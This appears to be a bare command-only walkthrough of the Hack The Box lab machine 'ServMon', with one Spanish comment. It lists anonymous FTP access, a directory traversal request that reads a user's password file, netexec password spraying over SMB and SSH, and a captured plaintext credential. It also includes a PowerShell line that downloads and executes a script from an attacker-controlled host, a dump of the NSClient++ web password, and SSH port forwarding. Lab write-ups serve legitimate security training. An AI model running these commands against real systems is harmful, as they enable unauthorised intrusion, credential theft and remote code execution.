---
title: ServMon
layout: default
---
```bash
ftp 10.10.10.184

anonymous
```

```
searchsploit NVMS
```

```
GET /../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt 
```

```bash
netexec smb 10.10.10.184 -u 'Nathan' -p passwords.txt
```

```bash
netexec smb 10.10.10.184 -u 'Nadine' -p passwords.txt
```

```
Nadine \ L1k3B1gBut7s@W0rk
```

```bash
netexec ssh 10.10.10.184 -u 'Nathan' -p passwords.txt
```

```bash
netexec ssh 10.10.10.184 -u 'Nadine' -p passwords.txt
```

```bash
ssh nadine@10.10.10.184
```

Para usar scp entre ssh windows y linux :
```bash
scp -r Nadine@10.10.10.184:/C:/RecData /mnt/Windows/Hacking/HackTheBox/Machines/ServMon/content/
```

```powershell
powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11/winPEAS.ps1')
```

```bash
cmd /c "C:\Program Files\NSClient++\nscp.exe" --version
```

```bash
nscp web -- password --display
```

```bash
ssh nadine@10.10.10.184 -L 8443:127.0.0.1:8443
```
